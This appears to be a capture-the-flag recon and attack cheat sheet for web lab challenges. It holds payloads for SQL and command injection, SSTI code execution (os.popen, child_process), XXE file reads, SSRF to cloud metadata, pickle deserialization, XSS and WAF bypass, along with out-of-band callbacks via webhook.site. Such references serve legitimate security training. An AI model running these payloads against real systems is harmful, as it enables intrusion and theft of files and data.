# Recon & Attack Playbook

A command reference for web/network challenge recon. CWE class on the left,
first move on the right, then the tool invocations and payloads.

## CWE to first move

| CWE | Class | First move |
|---|---|---|
| 89 | SQL injection | `'` to trigger an error, then `ORDER BY` / `UNION SELECT NULL,..`; decide in-band vs blind |
| 78 | OS command injection | `;` `\|` `&&` `$(...)` `` `...` `` newline `%0A`; find where the output lands |
| 94 | Code injection (SSTI / deserialize) | `{{7*7}}` or `<%= 7*7 %>`; pickle `__reduce__` if the input is a blob |
| 79 | XSS | reflect a marker; `<img src=x onerror=...>`; reflected / stored / DOM |
| 611 | XXE | POST XML `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///...">]>` then `&x;` |
| 918 | SSRF | give it a URL: `file:///...`, `http://169.254.169.254`, internal hosts |
| 426 | Untrusted search path | privileged helper runs a binary by name; plant your own earlier in `$PATH` |
| 1392 / 521 | Default / weak creds | `admin:admin`, `admin:admin123`, product name, `changeme` |
| 293 | Referer auth | forge `Referer:` header to the authorized page |
| 598 | Secret in GET URL | check reviews / logs / history for a `?token=` or `?sid=` link |
| 602 | Client-side enforcement | flip a cookie or field (`role=admin`), resend |
| 384 | Session fixation | set a known sid, get it authenticated, reuse it |
| 347 | Bad signature verify | JWT `alg:none` (strip sig) or forge claims |
| 327 | Broken crypto | weak key, brute (e.g. 4-digit HMAC); reversible encoding |
| 330 / 331 | Weak randomness | token = `hash(time/username)`, regenerate it |
| 204 | Response discrepancy | user enumeration (valid vs invalid differ in size or text) |
| 640 | Weak pw recovery | reset token derived from username, compute admin's |
| 257 / 522 | Recoverable creds | base64 / obfuscated password in a file or backup, decode |
| 307 | No brute-force limit | dictionary / credential spray |
| 613 | Session not expired | reuse an old or logged-out session id |
| 200/209/538/548/489/445 | Info disclosure | `.git`, `.bak`, `/debug`, dir listing, verbose errors, comments |
| 639 | IDOR | change an id or key (`/note/3`, `/user/7`) |

## nmap

```bash
nmap -sn 10.x.x.0/24                 # host discovery
nmap -sV -T3 <host>                  # service + version
nmap -p- -T4 <host>                  # all TCP ports
nmap -sUV -T3 -p 53,161,<n> <host>   # UDP, small port sets (SNMP on 161)
nmap -sC -sV <host>                  # default scripts + versions
nmap --script http-title,http-headers -p 80,8000-8090 <host>
nmap --script vulners -sV <host>     # CVE guesses, noisy
```

Name+port vhosts (`<name>.chal.deti:<port>`) behind wildcard DNS are mostly web.
Don't skip UDP.

## curl (web recon)

```bash
curl -s URL                                   # body
curl -sI URL                                  # headers only
curl -s -i URL                                # headers + body
curl -s URL | grep -iE 'form|input|name=|action|textarea'   # forms / fields
curl -s URL | grep -oiE 'href="[^"]+"'        # links
curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' URL   # size/time oracle

# POST
curl -s --data-urlencode "field=value" URL             # safe encoding
curl -s --data "field=raw%0Astuff" URL                 # send literal %XX (server decodes)
curl -G --data-urlencode "q=term" URL                  # GET with encoded params

# cookies / headers / redirects
curl -s -c jar.txt URL ; curl -s -b jar.txt URL        # save / send cookies
curl -s -b "role=admin" URL                            # specific cookie
curl -s -L URL                                         # follow redirects
curl -s -H "Authorization: Bearer <jwt>" URL
curl -s -H "Referer: http://host/authorized" URL
curl -s -H "X-Forwarded-For: 127.0.0.1" URL

# extract a <pre> / result box
curl -s URL | sed -e 's/.*<pre[^>]*>//' -e 's#</pre>.*##'
```

URL-encoding reference: space `%20`, `;` `%3B`, `?` `%3F`, `|` `%7C`, `'` `%27`,
`&` `%26`, `#` `%23`, newline `%0A`. Keep the trailing space after `--` in SQL comments.

## Content discovery

```bash
gobuster dir -u URL -w <wordlist> -t 20
ffuf -u URL/FUZZ -w <wordlist>
curl -s URL/robots.txt ; curl -s URL/.git/HEAD ; curl -s URL/sitemap.xml
# backups: config.php.bak, .env, app.py~, *.bak, /export/, /reports/
```

Other tools: Burp/ZAP (Repeater/Intruder), sqlmap, nc / `python3 -m http.server`
for OOB listeners, git-dumper for a reachable `.git`.

## Payloads

SQLi (in-band, then blind):

```
'                                   # error means injectable
' ORDER BY 5-- -                    # column count
' UNION SELECT NULL,NULL,..-- -     # match columns
' UNION SELECT 1,@@version,3-- -    # MySQL (SQLite: FROM sqlite_master)
' OR 1=1-- -   vs   ' OR 1=2-- -    # boolean oracle (blind)
```

Blind: `substr`/`substring`, `ascii()` (MySQL/MariaDB) or `unicode()` (SQLite),
binary-search the byte. Time delay: MariaDB `SLEEP(3)`; SQLite has none (heavy
CTE / `randomblob`).

Command injection (watch where output lands: response, log, file, or OOB):

```
x;id    x|id    x&&id    x$(id)    x`id`    x%0Aid
```

SSTI, confirm with `{{7*7}}` (Jinja2) or `<%= 7*7 %>` (EJS):

```
Jinja2: {{ lipsum.__globals__.os.popen('cat /flag/flag').read() }}
EJS:    <%= process.getBuiltinModule('child_process').execSync('cat /flag/flag') %>
```

XXE: `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag/flag">]>` then `&x;` in a reflected field.

SSRF: `url=file:///flag/flag` (or internal / metadata hosts).

Pickle (CWE-94): `class R: def __reduce__(self): return (open,("/flag/flag","r"))`, then base64.

XSS: default `<img src=x onerror=PAYLOAD>`; alternatives `<svg onload=...>`,
`<body onload=...>`. Context: body vs `value="..."` (break out with `">`).
Sink: server-rendered vs `innerHTML` (DOM, where `<script>` is ignored).

## Blind oracles (nothing comes back directly)

- Count flips, content/marker present-or-not, error flash true/false, time (`SLEEP`).
- Out-of-band: network fetch (SSRF) or file write to a served dir.
- Reachability gotcha: the app often can't reach your VM subnet but can reach the
  internet. Use an internet collector (webhook.site), or prefer `file://` /
  file-write channels that need no callback.

## Lab-specific patterns

- Flag file is usually `/flag/flag`; DB flag in `vault.secret`.
- Read the client-side JS the page sends (view-source / DevTools); it often hands you the mechanism.
- Second-order: validated or stored in one feature, executed in another.
- Allowlist checks the command, not the argument (`head /flag/flag` slips a reader allowlist).
- WAF bypass: double-encoding (`%253B`) and duplicate params (HPP).
- `requests.Session` plus Flask flash can desync blind oracles; use fresh requests.
- Encoding depth: WAF and app may decode a different number of times.

## XSS context cheat

| | sink | runs | `<script>`? | tell |
|---|---|---|---|---|
| reflected | server reflects into HTML | on load | yes (if valid + ordered) | payload in HTTP response |
| stored | server stores, renders to all | every viewer | yes | persists across visitors |
| DOM | JS `innerHTML = input` | client, after load | ignored | payload not in HTTP response |

`<img src=x onerror=...>` works in all three. `<script>` fails in DOM (innerHTML)
and can hit definition-ordering issues (runs before a later-defined helper exists),
so default to `<img onerror>` / `<svg onload>`.
